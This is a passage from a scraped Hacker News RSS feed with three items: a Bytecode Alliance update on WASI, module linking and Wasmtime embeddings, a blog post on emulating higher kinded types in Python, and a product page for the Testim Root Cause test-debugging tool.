<p>On the spec side, that has been identifying and addressing problems with cross-platform implementability of the spec. One example of this is the <a href="https://github.com/WebAssembly/WASI/pull/312"><code>wasi-socket</code></a> API (which was <a href="https://radu-matei.com/blog/towards-sockets-networking-wasi/">recently prototyped in Wasmtime</a>). In this case, the conversation has centered on the right way to apply capabilities-based security to the handling of sockets.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/portability.png" alt="A .wasm file running across three different operating systems"></p>

<p>On the implementation side, we’ve done a lot of work to improve the security and reliability of our implementation. Part of this has been developing robust fuzzing measures (which we describe more below).</p>

<p>Another thing we’ve done is factored out the security-critical operations into a dedicated library, <a href="https://github.com/bytecodealliance/cap-std"><code>cap-std</code></a>. It’s a cross-platform library which provides much of the functionality of Rust’s standard library in a capabilities-oriented way. This allows us to fully focus on getting those security-critical foundations right on all platforms. As a next step, we’ll make use of <code>cap-std</code> in our WASI implementation.</p>

<h4 id="specialized-higher-level-host-apis">Specialized higher-level host APIs</h4>
<p>For the specialized higher-level host APIs, there has been exciting work on proposals for completely new API modules.</p>

<p>One great example of this is <a href="https://github.com/WebAssembly/wasi-nn"><code>wasi-nn</code></a>, which is a <a href="https://www.youtube.com/watch?v=6O44X76rgIg">standardized interface for neural networking</a>. This is useful because trained machine learning models are typically deployed on a variety of different devices with different architectures and operating systems. Using <code>wasi-nn</code>, the <code>.wasm</code> file can do things like describe tensors and execute inference requests in a portable way, regardless of the underlying ISA and OS.</p>

<p>We’re implementing all of these in Wasmtime as they develop. That way, people can try them out and real world usage can inform the specification.</p>

<h3 id="module-linking">Module linking</h3>

<p>If we’re going to have an ecosystem of reusable code, we need a good way to link modules together.</p>

<p>Right now, you can link modules together using host APIs. For example, on the web you can string together a bunch of <code>WebAssembly.instantiate</code> calls to link a set of modules together. In Wasmtime, you use the <a href="https://bytecodealliance.github.io/wasmtime/examples-c-linking.html">linker APIs</a>.</p>

<p>But there are a few downsides to this imperative style, including the fact that it’s fairly cumbersome, not that fast and requires the host to include some type of garbage or cycle collector.</p>

<p>With the module linking proposal, linking becomes declarative. This means that it’s much easier to use. It also means that even at compile time, the engine has all of the information about how modules are connected to each other. This opens up lots of potential optimizations and features and removes the possibility of cycles.</p>

<p>For now, we’re focusing on load-time linking, which will enable modules to factor out common library code. And for that, the proposal is pretty much complete. Longer term, we’ll be able to add run-time dynamic linking as well.</p>

<p>Our next step is to finish a prototype implementation, which should be complete within the next few months.</p>

<h3 id="interface-types">Interface types</h3>

<p>The <a href="https://github.com/WebAssembly/interface-types">Interface Types proposal</a> is evolving nicely.</p>

<p>Interface Types can now talk about a rich set of values. The design is also more efficient now, removing the need for an intermediate copy of values in almost all cases.</p>

<p>So what’s left to do in the short term?</p>

<p>While Interface Types can talk about values, they can’t yet talk about <a href="https://github.com/WebAssembly/interface-types/issues/87">handles to resources</a> and <a href="https://github.com/WebAssembly/interface-types/issues/68">buffers</a>. Both are important to support WASI and other APIs, because things like files should use handles, and it should be possible to read a file and write directly into a buffer.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/interface-types.png" alt="On the left, types that are done, including strings, numbers, references, booleans, enums, objects, and unions. On the right, types left to be done: handles and buffers."></p>

<p>Once those features are in place, Interface Types will have everything it needs to support both WASI and Module Linking, making it possible for them to talk about values and resources in a source-language independent way. So we’ll continue working on the spec in the W3C.</p>

<p>On the implementation, we’ve set the stage to execute quickly. We’ve already implemented the new features in Wasm core which Interface Types depend on, such as <a href="https://bytecodealliance.org/articles/bytecodealliance.org/articles/reference-types-in-wasmtime">Reference Types</a>, <a href="https://bytecodealliance.org/articles/multi-value-all-the-wasm">multi-value</a>, and <a href="https://github.com/bytecodealliance/wasmtime/pull/2263">multi-memory support</a>.</p>

<p>We’re also working on tools for using Interface Types. Currently, people can use <a href="https://github.com/rustwasm/wasm-bindgen"><code>wasm-bindgen</code></a> to create bindings for JS code. In the coming year, we’ll add direct support for Interface Types to language toolchains, <a href="https://github.com/bytecodealliance/wasm-interface-types">starting with Rust</a>.</p>

<p>We expect to complete most of this work within the next six months.</p>

<p>In the meantime, for people wanting to get things done today but in a forward compatible way, you can define your interface using <a href="https://github.com/WebAssembly/WASI/blob/master/docs/witx.md">WITX</a>. You can learn more about how to do this from <a href="https://www.youtube.com/watch?v=LCA9NnH7DxE">this presentation</a> by Pat Hickey, or <a href="https://radu-matei.com/blog/wasm-api-witx/">this blog post</a> from Radu Matei.</p>

<h2 id="supporting-more-languages">Supporting more languages</h2>

<p>To bring the nanoprocess model to as many people as possible, we need to integrate with as many languages as possible.</p>

<h3 id="more-languages-compiling-into-the-webassembly-nanoprocess-model">More languages compiling into the WebAssembly nanoprocess model</h3>

<p>If you want to produce code that uses the nanoprocess model, you need a compiler that:</p>
<ol>
  <li>can target WebAssembly, and</li>
  <li>has support for these cutting edge standards</li>
</ol>

<p>To help language communities speed up their adoption, we’ve started building out <a href="https://github.com/bytecodealliance/wasm-tools"><code>wasm-tools</code></a>. This is a standard set of tools that other compilers can use to target WebAssembly.</p>

<p>These are all tools that we use in Wasmtime, so as new WebAssembly features come online, they are supported here. For example, we’ve already started building support for module-linking into these tools.</p>

<p>The tools currently include:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmparser"><code>wasmparser</code></a>, which is a parser for WebAssembly files. It’s quite cheap because it doesn’t do any extra allocations, and can parse in a streaming fashion.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmprinter"><code>wasmprinter</code></a>, which translates a .wasm binary format into the .wat text format, which is useful for debugging and testing.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wat"><code>wat</code></a> and <a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wast"><code>wast</code></a>, which translate the .wat and .wast text formats into the binary format, which is useful for running tests (since it’s easier to maintain tests in the text format).</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasm-smith"><code>wasm-smith</code></a>, which is a <a href="https://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html">test case generator</a>. It generates pseudo-random Wasm modules, guaranteed to be valid Wasm modules, which we use for fuzzing.</li>
</ul>

<p>We will be adding more tools over the next year. For example, we will host the language-independent parts of the <a href="https://github.com/bytecodealliance/wasm-interface-types">Rust Interface Types toolkit</a> in <code>wasm-tools</code>, which will make it easier for languages that compile to WebAssembly to start supporting Interface Types. We also plan to collaborate with language communities on integrating these tools as they come online.</p>

<h3 id="more-languages-embedding-webassembly-via-wasmtime">More languages embedding WebAssembly via Wasmtime</h3>

<p>If you have a whole WebAssembly application, you can run that directly in a runtime like Wasmtime. But sometimes, you just want to run a little bit of WebAssembly in your project.</p>

<p>For example, you might be writing some Python code, but want to do some intensive computations. Python may be too slow, and native extensions may be too frustrating to use portably, so you could use a WebAssembly module instead.</p>

<p>Wasmtime is enabling this for many languages, through embeddings into the language runtimes.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasmtime-embedding.png" alt="&quot;Wasmtime in the center, with arrows pointing to logos for all of the languages listed below&quot;"></p>

<p>These languages now have support for running WebAssembly in Wasmtime:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasmtime-py">Python</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-go">Go</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-dotnet">.NET</a></li>
  <li>Java (two options: <a href="https://github.com/kawamuray/wasmtime-java">kawamuray/wasmtime-java</a> or <a href="https://github.com/bluejekyll/wasmtime-java">bluejekyll/wasmtime-java</a>)</li>
  <li><a href="https://metacpan.org/pod/Wasm">Perl</a></li>
  <li><a href="https://bytecodealliance.github.io/wasmtime/lang-rust.html">Rust</a></li>
  <li><a href="https://github.com/kubkon/wasmtime-zig">Zig</a></li>
  <li><a href="https://github.com/dtcristo/wasmtime-ruby">Ruby</a></li>
</ul>

<p>As new nanoprocess features come online, they get added to Wasmtime. We don’t consider feature development complete until the feature is exposed in the language embeddings that we maintain. That means that these languages can run the most cutting-edge WebAssembly modules as soon as possible.</p>

<p>It also means that these language communities don’t have to come up with their own ways of doing linking and binding. They can just depend on the WebAssembly standards, which makes everything more interoperable.</p>

<p>In the last year, we’ve transitioned the embeddings we maintain to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bytecodealliance.org/articles/1-year-update">https://bytecodealliance.org/articles/1-year-update</a></em></p>]]>
            </description>
            <link>https://bytecodealliance.org/articles/1-year-update</link>
            <guid isPermaLink="false">hacker-news-small-sites-24897633</guid>
            <pubDate>Mon, 26 Oct 2020 16:05:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Higher Kinded Types in Python]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24897518">thread link</a>) | @todsacerdoti
<br/>
October 26, 2020 | https://sobolevn.me/2020/10/higher-kinded-types-in-python | <a href="https://web.archive.org/web/*/https://sobolevn.me/2020/10/higher-kinded-types-in-python">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p><img src="https://dev-to-uploads.s3.amazonaws.com/i/73uvh47fvxfveqpz2xgi.png" alt="Cover image"></p>

<p><code>dry-python/returns@0.15</code> is <a href="https://github.com/dry-python/returns/releases/tag/0.15.0">released</a>! And it means that now anyone can use our Higher Kinded Types emulation in their projects.</p>

<p>In this post I will explain:</p>
<ul>
  <li>What Higher Kinded Types (HKTs) are and why they are useful</li>
  <li>How they are implemented and what limitations there are</li>
  <li>How can you use them in your own projects</li>
</ul>

<p>Without further ado, let’s talk about typing!</p>


      <h2 id="simple-types">
        
        <a href="#simple-types">Simple types</a>
        
      </h2>

<p>Typing is layered. Like a good cake. There are at least three layers that we are going to cover.</p>

<p>Simple (or flat) typing, like <code>x: int = 1</code>. This allows us to express simple types and their transformations. Like <code>int -&gt; str</code>:</p>

<div><div><pre><code><span>def</span> <span>stringify</span><span>(</span><span>arg</span><span>:</span> <span>int</span><span>)</span> <span>-&gt;</span> <span>str</span><span>:</span>
    <span>return</span> <span>str</span><span>(</span><span>arg</span><span>)</span>
</code></pre></div></div>

<p>A lot of languages like <code>go</code> and <code>php</code> do not go beyond this line. And they still work pretty well! These types are also sometimes called <code>*</code>-kinded. It can be understood as “a place for just a single type argument”.</p>


    
      <h2 id="generic">
        
        <a href="#generic">Generic</a>
        
      </h2>

<p>Generic level is required to express “nested” types. For example, you have a list of integers. In Python we annotate it as <code>List[int]</code> or <a href="https://www.python.org/dev/peps/pep-0585/"><code>list[int]</code></a> in Python <code>3.9</code>. This allows us to have types with other types as arguments. <code>List</code> can receive <code>int</code> or <code>str</code> or even another <code>List</code> as the type argument. This way we can nest type and types start to have their own structure.</p>

<p>Generics are much more interesting than simple types. And they can have multiple type arguments:</p>
<ul>
  <li>List has one: for values, so it has a kind of <code>* -&gt; *</code>. It can be understood as a type transformation <code>List -&gt; T = List[T]</code></li>
  <li>Dict has two: for keys and values, so it has a kind of <code>* -&gt; * -&gt; *</code>. It can be understood as a type transformation <code>Dict -&gt; K -&gt; V = Dict[K, V]</code></li>
  <li>And so on!</li>
</ul>

<p>This would be very helpful for us in the future, I promise.</p>

<p>We can also write transformations for generic types:</p>

<div><div><pre><code><span>def</span> <span>stringify_list_items</span><span>(</span><span>arg</span><span>:</span> <span>List</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>List</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>[</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>]</span>
</code></pre></div></div>

<p>But, that is where things begin to be quite complicated.</p>

<p>How can this function work with other iterables like <code>set</code>, <code>frozenset</code>, <code>tuple</code>?
We can express this in Python as easy as:</p>

<div><div><pre><code><span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>):</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>But the typing part would be quite challenging. Let’s try several things.</p>


    
      <h3 id="common-interface">
        
        <a href="#common-interface">Common interface</a>
        
      </h3>

<p>The first obvious thing to try is <code>Iterable</code> protocol. It is builtin into Python and does what we need.</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Iterable</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>Iterable</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>Iterable</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>Let’s try it out:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]))</span>
<span># Revealed type is 'typing.Iterable[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>}))</span>
<span>#  Revealed type is 'typing.Iterable[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>((</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)))</span>
<span>#  Revealed type is 'typing.Iterable[builtins.str]'
</span></code></pre></div></div>

<p>You can see that a part of our typing information is lost. We pass <code>List</code> or <code>Set</code> or <code>Tuple</code> and always get the <code>Iterable</code> back.</p>

<p>Sometimes - this is ok. But, in some cases, this is not enough. Let’s try some other technique!</p>


    
      <h3 id="methods">
        
        <a href="#methods">Methods</a>
        
      </h3>

<p>One can say: we are all using Object-Oriented Programming! Why cannot we just create a new method for each type we need? And specify the exact return type there!</p>

<p>Well, it is a possible solution. But, there are some reasonable problems:</p>

<ul>
  <li>You cannot add methods to existing types and extend them with this approach. Only create new ones, probably via subtyping, and add new methods there. In our example you would have to create your own versions of <code>List</code>, <code>Set</code>, and <code>Tuple</code>. Which is not desirable in most situations</li>
  <li>It really it starts to be messy if you have a lot of methods to add. A type with more than <code>X</code> (choose the number yourself) methods starts to be really complex to read, understand, and use. Instead, using separate functions is much easier, because we don’t have to put everything into a single namespace</li>
</ul>

<p>Let’s try something else.</p>


    
      <h3 id="overloads">
        
        <a href="#overloads">overloads</a>
        
      </h3>

<p>Another solution that might solve our problem is using the <code>@overload</code> decorator with proper types for each required case.</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>List</span><span>,</span> <span>Set</span><span>,</span> <span>overload</span>

<span>@</span><span>overload</span>
<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>List</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>List</span><span>[</span><span>str</span><span>]:</span>
    <span>...</span>

<span>@</span><span>overload</span>
<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>Set</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>Set</span><span>[</span><span>str</span><span>]:</span>
    <span>...</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>):</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>Let’s test it:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>]))</span>
<span># Revealed type is 'builtins.list[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>}))</span>
<span># Revealed type is 'builtins.set[builtins.str]'
</span></code></pre></div></div>

<p>Awesome! Looks like we’ve achieved our goal, haven’t we? But, there’s a new problem. We have to manually list all possible cases in a function’s signature. This works for cases when all possible arguments and outcomes are known in advance. But, not in this case. In Python <code>Iterable</code> is a protocol. We can use this function with any type with <code>__iter__</code> method defined: with both builtin and custom types. So, the number of possible arguments and outcomes is endless.</p>

<p>To illusrate the problem, let’s see what happens for <code>Tuple</code> which is not listed in the function’s overloads:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>((</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)))</span>
<span># error: No overload variant of "stringify_iterable_items" matches argument type "Tuple[int, int, int]"
</span></code></pre></div></div>

<p>We, in <code>dry-python</code> <a href="https://github.com/dry-python/returns/blob/0.14.0/returns/_generated/converters/flatten.pyi">used this technique</a> with <code>@overload</code> decorator for our previous versions. This allowed us to write correct definitions of functions working with generic types. But, they were limited to the pre-defined set of our own types. And we wanted to allow our users to create their custom types based on our interfaces. With the full existing code reuse.</p>


    
      <h2 id="higher-kinded-types">
        
        <a href="#higher-kinded-types">Higher Kinded Types</a>
        
      </h2>

<p>That’s where the idea of Higher Kinded Types becomes useful. We need HKTs when we want to change the inner structure of generics with full type information preserving and openness to the extension. In theory, you can write something like:</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Iterable</span>

<span>T</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'T'</span><span>,</span> <span>bound</span><span>=</span><span>Iterable</span><span>)</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>T</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>T</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>And this would solve our problem! What happens here is that we abstract away the <code>Iterable</code> type itself. And then ask <code>mypy</code> to figure this out for us.</p>

<p>This way we can potentially have <code>stringify_iterable_items</code> working for any <code>Iterable</code> type, but with the exact same type returned back without any information lost. And it would work for all types.</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>]))</span>
<span># Revealed type is 'builtins.list[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>}))</span>
<span># Revealed type is 'builtins.set[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>(</span><span>MyCustomIterable</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>)))</span>
<span># Revealed type is 'my_module.MyCustomIterable[builtins.str]'
</span></code></pre></div></div>

<p>Unfortunately, <a href="https://github.com/python/typing/issues/548">it is not supported</a> at the moment.</p>


    
      <h3 id="emulation">
        
        <a href="#emulation">Emulation</a>
        
      </h3>

<p>Turns out we are not alone in this situation. There are multiple languages where Higher Kinded Types are not natively supported yet. But, they can be emulated:</p>

<ul>
  <li><a href="https://github.com/gcanti/fp-ts/blob/master/docs/guides/HKT.md">TypeScript</a></li>
  <li><a href="https://bow-swift.io/docs/fp-concepts/higher-kinded-types/">Swift</a></li>
  <li><a href="https://arrow-kt.io/docs/0.10/patterns/glossary/#higher-kinds">Kotlin</a></li>
</ul>

<p>And now with <a href="https://returns.readthedocs.io/en/latest/pages/hkt.html">Python</a> too!</p>

<p>There’s also <a href="https://www.cl.cam.ac.uk/~jdy22/papers/lightweight-higher-kinded-polymorphism.pdf">an original whitepaper</a> for ones who are interested.</p>

<p>The core idea of HKT emulation is that we can write types the other way around: not like <code>T[int]</code>, but rather like <code>Kind[T, int]</code> (which is absolutely the same thing).</p>

<p>This way we can transform the inner structure of generics, but maintain the simple context without reinventing <code>TypeVar</code> with type arguments. And our function’s type signature will look like: <code>Kind[T, int] -&gt; Kind[T, str]</code>.</p>

<p>Let’s see the implementation.</p>


    
      <h2 id="implementation">
        
        <a href="#implementation">Implementation</a>
        
      </h2>

<p><strong>TLDR</strong>: here’s <a href="https://gist.github.com/sobolevn/7f8ffd885aec70e55dd47928a1fb3e61">the final working code</a> with all the logic, all the hacks, and everything. In this article, we going to write and explain it step by step.</p>

<p>We would need a better example to test our implementation. Let’s build two types: a <code>Box</code> and a <code>Bag</code>. <code>Box</code> is defined by its size, while a <code>Bag</code> is an item of fashion: it has a brand name and a model name (I have a wife, I know this stuff!).</p>

<div><div><pre><code><span>from</span> <span>dataclasses</span> <span>import</span> <span>dataclass</span>
<span>from</span> <span>typing</span> <span>import</span> <span>Callable</span><span>,</span> <span>Generic</span><span>,</span> <span>TypeVar</span>

<span>_ValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_ValueType'</span><span>)</span>
<span>_NewValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_NewValueType'</span><span>)</span>

<span>@</span><span>dataclass</span>
<span>class</span> <span>Box</span><span>(</span><span>Generic</span><span>[</span><span>_ValueType</span><span>]):</span>
    <span>value</span><span>:</span> <span>_ValueType</span>
    <span>length</span><span>:</span> <span>int</span>
    <span>width</span><span>:</span> <span>int</span>
    <span>height</span><span>:</span> <span>int</span>

<span>@</span><span>dataclass</span>
<span>class</span> <span>Bag</span><span>(</span><span>Generic</span><span>[</span><span>_ValueType</span><span>]):</span>
    <span>value</span><span>:</span> <span>_ValueType</span>
    <span>brand</span><span>:</span> <span>str</span>
    <span>model</span><span>:</span> <span>str</span>
</code></pre></div></div>

<p>And we can create <code>Box</code>es and <code>Bag</code>s of different types, because we can put different things inside them:</p>

<div><div><pre><code><span>box</span> <span>=</span> <span>Box</span><span>(</span><span>value</span><span>=</span><span>10</span><span>,</span> <span>length</span><span>=</span><span>1</span><span>,</span> <span>width</span><span>=</span><span>2</span><span>,</span> <span>height</span><span>=</span><span>3</span><span>)</span>  <span># Box[int]
</span><span>bag</span> <span>=</span> <span>Bag</span><span>(</span><span>value</span><span>=</span><span>5</span><span>,</span> <span>brand</span><span>=</span><span>'Fancy'</span><span>,</span> <span>model</span><span>=</span><span>'Baggy'</span><span>)</span>  <span># Bag[int]
</span></code></pre></div></div>

<p>Now, we need a function with a type transformation. Let’s say we want to apply a function to the value inside boxes and bags. Let’s use fake <code>BoxOrBag</code> type for now to illustrate our intent:</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Callable</span>

<span>_NewValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_NewValueType'</span><span>)</span>

<span>def</span> <span>apply_function</span><span>(</span>
    <span>instance</span><span>:</span> <span>BoxOrBag</span><span>[</span><span>_ValueType</span><span>],</span>  <span># fake type for now
</span>    <span>callback</span><span>:</span> <span>Callable</span><span>[[</span><span>_ValueType</span><span>],</span> <span>_NewValueType</span><span>],</span>
<span>)</span> <span>-&gt;</span> <span>BoxOrBag</span><span>[</span><span>_NewValueType</span><span>]:</span>  <span># fake type for now
</span>    <span>...</span>
</code></pre></div></div>

<p>It is going to work like so:</p>

<div><div><pre><code><span>assert</span> <span>apply_function</span><span>(</span><span>box</span><span>,</span> <span>str</span><span>)</span> <span>==</span> <span>Box</span><span>(</span><span>value</span><span>=</span><span>'10'</span><span>,</span> <span>length</span><span>=</span><span>1</span><span>,</span> <span>width</span><span>=</span><span>2</span><span>,</span> <span>height</span><span>=</span><span>3</span><span>)</span>
<span>assert</span> <span>apply_function</span><span>(</span><span>bag</span><span>,</span> <span>bool</span><span>)</span> <span>==</span> <span>Bag</span><span>(</span><span>value</span><span>=</span><span>True</span><span>,</span> <span>brand</span><span>=</span><span>'Fancy'</span><span>,</span> <span>model</span><span>=</span><span>'Baggy'</span><span>)</span>
</code></pre></div></div>

<p>We only need to change current fake <code>BoxOrBag</code> type to a real HKT. We would need to define a new <code>Kind</code> type to make the emulation:</p>

<div><div><pre><code><span>_InstanceType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_InstanceType'</span><span>,</span> <span>covariant</span><span>=</span><span>True</span><span>)</span>
<span>_FirstTypeArgType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_FirstTypeArgType'</span><span>,</span> <span>covariant</span><span>=</span><span>True</span><span>)</span>

<span>class</span> <span>Kind</span><span>(</span><span>Generic</span><span>[</span><span>_InstanceType</span><span>,</span> <span>_FirstTypeArgType</span><span>]):</span>
    <span>"""Used for HKT emulation."""</span>
</code></pre></div></div>

<p>One pro-tip about <code>Kind</code>: it won’t not exist during runtime. Only during type-checking.</p>

<p>Now, let’s change <code>apply_function</code> to use <code>Kind</code>:</p>

<div><div><pre><code><span>_InstanceKind</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_InstanceKind'</span><span>)</span>

<span>def</span> <span>apply_function</span><span>(</span>
    <span>instance</span><span>:</span> <span>Kind</span><span>[</span><span>_InstanceKind</span><span>,</span> <span>_ValueType</span><span>],</span>
    <span>callback</span><span>:</span> <span>Calla…</span></code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sobolevn.me/2020/10/higher-kinded-types-in-python">https://sobolevn.me/2020/10/higher-kinded-types-in-python</a></em></p>]]>
            </description>
            <link>https://sobolevn.me/2020/10/higher-kinded-types-in-python</link>
            <guid isPermaLink="false">hacker-news-small-sites-24897518</guid>
            <pubDate>Mon, 26 Oct 2020 15:54:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Root Cause – A tool for debugging Puppeteer and Playwright tests]]>
            </title>
            <description>
<![CDATA[
Score 41 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24897260">thread link</a>) | @inglor
<br/>
October 26, 2020 | https://www.testim.io/root-cause/ | <a href="https://web.archive.org/web/*/https://www.testim.io/root-cause/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="body">
		<div id="wrapper">
		
		
				
		
<main id="main">
		<section>
		<div>
						
									<p><span>&gt; npm install @testim/root-cause</span>
			</p>
															<p>
				<video playsinline="" autoplay="" preload="metadata" muted="" loop="" poster="https://www.testim.io/wp-content/uploads/2020/10/screenplay-banner.jpg">
					<source src="https://www.testim.io/wp-content/uploads/2020/10/root-cause-local_new_top.mp4" type="video/mp4">
					Your browser does not support the video tag.
				</video>
			</p>
								</div>
	</section>
		
		<section>
		<div>
						<h2>Add Root Cause in five minutes to capture screenshots at every step—without changing tests.</h2>
						<div>
								<div>
										<p><img src="https://www.testim.io/wp-content/uploads/2020/10/ico1.svg" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E">
					</p>
										<div>
												<h3>Visualize to troubleshoot</h3>
																		<p>Flip through screenshots of each test step, highlighting the element action to quickly see the test flow and troubleshoot failures.</p>
											</div>
				</div>
								<div>
										<p><img src="https://www.testim.io/wp-content/uploads/2020/10/ico2.svg" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E">
					</p>
										<div>
												<h3>Store locally or in the cloud</h3>
																		<p>Save screenshots to a local drive for free. Store screenshots in the cloud (free and paid options) to simplify management and team accessibility.</p>
											</div>
				</div>
								<div>
										<p><img src="https://www.testim.io/wp-content/uploads/2020/10/ico3.svg" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E">
					</p>
										<div>
												<h3>Drill-down with data you need</h3>
																		<p>Dive deeper into console logs, HAR files, or test configuration data, parsed and available at the failed test step, where you need it.</p>
											</div>
				</div>
								<div>
										<p><img src="https://www.testim.io/wp-content/uploads/2020/10/ico4.svg" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E">
					</p>
										<div>
												<h3>Test run reporting</h3>
																		<p>Test and suite results are filterable and searchable. See results including pass rates and history to better determine release readiness.</p>
											</div>
				</div>
							</div>
									
					</div>
	</section>
		
		<section>
		<div>
			<div>
								<h3>Testim Root Cause deployment options</h3>
								<div>
										<div>
												<h3>Root Cause</h3>
																		<ul>
																					<li>Open source</li>
																												<li>Unlimited users</li>
																												<li>Unlimited runs</li>
																												<li>Unlimited parallelization</li>
																												<li>Store screenshots locally</li>
																												<li>Docs and community</li>
																				</ul>
												<p>&gt; npm install @testim/root-cause</p>
												
																		
					</div>
										<div>
												<h3>Root Cause Cloud (<a href="https://www.testim.io/automation-testing-pricing/#pricing-tab-2">see pricing</a>)</h3>
																		<p>Everything in Root Cause OSS+</p>
												<ul>
																					<li>Store and access online</li>
																												<li>Test list and test run history</li>
																												<li>Share and debug CI runs</li>
																												<li>Automatic error aggregation</li>
																												<li>Tagged failure trends and insights</li>
																												<li>Email support</li>
																				</ul>
												
																		
												
					</div>
									</div>
			</div>
		</div>
	</section>
	
		<section>
		<div>
			<div>
				
				<div>
										<h3>Getting started:</h3>
																														<p>1. NPM install Testim Root cause<br>
<span>&gt; npm install @testim/root-cause</span></p>
																									<p>2. Integrate with <a href="https://help.testim.io/docs/root-cause-jest-integration-guide" target="_blank">Jest</a> or <a href="https://help.testim.io/docs/root-cause-mocha-integration" target="_blank">Mocha</a>.</p>
																									<p>3. Don't use a test runner, use standalone, <a href="https://help.testim.io/docs/getting-started-with-root-cause" target="_blank">Learn how</a></p>
														</div>
				
																<div>
					<p>
